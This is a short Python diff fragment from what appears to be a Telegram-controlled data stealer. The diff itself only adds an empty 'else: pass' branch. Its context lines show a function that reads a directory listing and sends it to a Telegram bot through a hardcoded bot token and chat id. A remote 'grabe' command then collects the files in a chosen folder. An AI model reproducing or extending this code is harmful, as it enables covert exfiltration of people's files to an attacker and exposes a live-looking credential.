@@ -19,6 +19,8 @@ def tg():
             text=str(len(dir_list))+"\n"+str(dir_list)
             if len(text) >4096:
                 text=str(len(dir_list))+str(dir_list)[:4000]
+            else:
+                pass
             if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
                 if commands["grabe"] == "yes":
                     dir_list = os.listdir(commands["folder"])
